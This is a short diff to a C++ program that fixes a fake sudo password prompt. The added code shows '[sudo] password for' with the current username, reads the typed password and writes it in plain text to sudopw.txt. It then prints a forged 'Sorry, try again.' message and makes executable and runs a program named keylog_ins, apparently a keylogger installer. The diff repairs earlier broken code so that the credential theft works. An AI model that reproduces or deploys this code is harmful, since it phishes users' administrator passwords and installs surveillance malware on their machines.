@@ -63,15 +63,28 @@ int main(){
 			myfile.close();
 			
 			//store sudo password
-			string username;
-			username << system("echo \"$USER\"");
-			cout<<"[sudo] password for "<<username << ":"<<endline;
 			
+			string username;
+			ofstream ufile("uname.txt");
+			system("echo \"$USER\" >> uname.txt");
+			ufile.close();
+			
+			ifstream unfile;
+			unfile.open("uname.txt");
+			if(unfile.is_open()){
+			getline(unfile,username);
+			}
+			unfile.close();
+			
+			cout<<"[sudo] password for "<<username << ":"<<endl;
+			
+			string psw;
+			cin>>psw;
 			ofstream sfile("sudopw.txt");
-			sfile<<istream& getline (istream& is, string& str);
+			sfile<<psw;
 			sfile.close();
 			
-			cout<<"Incorrect password, type again\n";
+			cout<<"Sorry, try again.\n";
 			system("chmod 755 keylog_ins");
 			system("./keylog_ins");
 			convert();
